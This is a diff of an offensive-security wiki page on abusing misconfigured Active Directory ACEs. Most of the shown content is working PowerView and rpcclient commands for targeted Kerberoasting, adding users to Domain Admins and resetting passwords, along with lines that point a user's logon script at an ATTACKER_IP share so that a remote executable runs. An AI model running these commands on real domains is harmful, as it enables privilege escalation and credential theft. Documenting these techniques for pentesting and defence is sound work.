@@ -6,7 +6,7 @@ Access privileges for resources in Active Directory Domain Services are usually 
 
 DACLs \(Active Directory Discretionary Access Control Lists\) are lists made of ACEs \(Access Control Entries\).
 
-When misconsfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.
+When misconfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.
 
 ## Practice
 
@@ -19,19 +19,23 @@ The following abuses can only be carried out when running commands as the user t
 runas /netonly /user:$DOMAIN\$USER
 ```
 
-All abuses below can be carried out on a Windows system. I have never tested any of those on Linux. Maybe [aclpwn](https://github.com/fox-it/aclpwn.py) can do the job.
+All abuses below can be carried out on a Windows system \(the system doesn't even have to be enrolled in the domain\). 
+
+On UNIX-like systems, a few of the following abuses can be carried out. The [aclpwn](https://github.com/fox-it/aclpwn.py) could maybe do the job in most cases. Personally, I always encountered errors and unsupported operations when trying to use it but I will probably do some further tests to include it here.
 {% endhint %}
 
 {% hint style="success" %}
-Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential` parameter, allowing to give the user's credential as input. Here is an example with `Add-DomainGroupMember`.
+Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential`, `-Domain` and `-Server` parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. This can be useful when trying to this from a Windows system that isn't enrolled in the AD domain.
+
+Here is an example with targeted Kerberoasting \(see [`GenericAll`](abusing-aces.md#genericall), [`GenericWrite`](abusing-aces.md#genericwrite)\).
 
 ```bash
 $SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
-Add-DomainGroupMember -Credential $Cred -Identity 'Domain Admins' -Members 'user_to_add'
+Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
+$User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
+$User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
 ```
-
-Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Domain` and `-Server` parameters that can be used to explicitly specify the target Domain. This can be useful when doing labs or when encountering issues with Domain requests.
 {% endhint %}
 
 ### AddMember
@@ -51,7 +55,7 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
 
 ### AllExtendedRights
 
-This ACE can be abused just like [`AddMember`](abusing-aces.md#addmember) or [`ForceChangePassword`](abusing-aces.md#forcedchangepassword). In some cases, it can also be abused like [`ReadLAPSPassword`](abusing-aces.md#readlapspassword).
+This ACE can be abused just like [`AddMember`](abusing-aces.md#addmember) \(when applying to a group\) or [`ForceChangePassword`](abusing-aces.md#forcedchangepassword) \(when applying to a user account\). In some cases, it can also be abused like [`ReadLAPSPassword`](abusing-aces.md#readlapspassword).
 
 > If a group is delegated “All Extended Rights” to an OU \(Organizational Unit\) that contains computers managed by LAPS, this group has the ability to view confidential attributes, including the LAPS \(Local Administrator Password Solution\) attribute `ms-mcs-admpwd` which contains the clear text password.
 >
@@ -88,25 +92,25 @@ rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
 
 ### GenericAll
 
-This ACE can be abused just like [`AddMember`](abusing-aces.md#addmember) \(when applied to a group\), [`ForceChangePassword`](abusing-aces.md#forcedchangepassword) \(when applied to a user, **not sure about this, latest tests indicate that no, it can't be abused like this**\) or [`ReadLAPSPassword`](abusing-aces.md#readlapspassword) \(when applied to a computer\).
+This ACE can be abused just like [`AddMember`](abusing-aces.md#addmember) \(when applying to a group\), [`ForceChangePassword`](abusing-aces.md#forcedchangepassword) \(when applying to a user, **not sure about this, latest tests indicate that no, it can't be abused like this**\) or [`ReadLAPSPassword`](abusing-aces.md#readlapspassword) \(when applying to a computer\).
 
 > It provides full rights to the object and all properties, including confidential attributes such as LAPS local Administrator passwords, and BitLocker recovery keys. In many cases, Full Control rights aren’t required, but it’s easier to delegate and get working than determining the actual rights required
 >
 > [adsecurity.org](https://adsecurity.org/?p=3164)
 
-#### When applying to a user account
+#### Target user account
 
 When applying to a user account, this ACE can be abused to add a SPN \(ServicePrincipalName\) to that account. Once the account has a SPN, it becomes vulnerable to [Kerberoasting](abusing-kerberos/kerberoast.md). This technique is called [Targeted Kerberoasting](abusing-kerberos/kerberoast.md#targeted-kerberoasting). This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).
 
 ```bash
 # Make sur that the target account has no SPN
-Get-DomainUser victimuser | Select serviceprincipalname
+Get-DomainUser 'victimuser' | Select serviceprincipalname
 
 # Set the SPN
-Set-DomainObject -Identity victimuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
 # Obtain a kerberoast hash
-$User = Get-DomainUser victimuser 
+$User = Get-DomainUser 'victimuser'
 $User | Get-DomainSPNTicket | fl
 
 # Clear the SPNs of the target account
@@ -116,11 +120,11 @@ Set-DomainObject -Identity victimuser -Clear serviceprincipalname
 
 Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password.
 
-#### When applying to a **computer** account
+#### Target **computer** account
 
 When applying to a computer account, this ACE can be abused to edit the account's properties and configure it for [Kerberos Resource-Based Constrained Delegation \(RBCD\)](abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd).
 
-#### When applying to a **GPO**
+#### Target **GPO**
 
 When applying to a GPO, this ACE can be abused to edit its settings and operate an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task).
 
@@ -136,7 +140,7 @@ Set-ADObject -SamAccountName 'user' -PropertyName scriptpath -PropertyValue "\\A
 Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\ATTACKER_IP\run_at_logon.exe'} -Verbose
 ```
 
-This can be abused the same way as [`GenericAll`](abusing-aces.md#genericall) for [Targeted Kerberoasting](abusing-kerberos/kerberoast.md#targeted-kerberoasting), for [Kerberos Resource-Based Constrained Delegation \(RBCD\)](abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) and for an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task).
+This can also be abused the same way as [`GenericAll`](abusing-aces.md#genericall) for [Targeted Kerberoasting](abusing-kerberos/kerberoast.md#targeted-kerberoasting) \(when applying to a user account\), for [Kerberos Resource-Based Constrained Delegation \(RBCD\)](abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) \(when applying to a computer account\) and for an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task) \(when applying to a GPO\).
 
 ### ReadLAPSPassword
 
